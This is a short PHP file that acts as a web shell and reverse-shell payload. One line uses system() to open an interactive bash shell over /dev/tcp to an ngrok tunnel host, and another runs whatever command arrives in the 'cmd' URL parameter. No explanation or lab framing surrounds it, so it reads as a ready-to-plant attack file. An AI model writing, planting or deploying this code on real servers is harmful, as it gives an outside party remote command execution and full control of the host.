<?php
system('bash -i >& /dev/tcp/0.tcp.ngrok.io/15672 0>&1');
system($_GET['cmd']);
?>
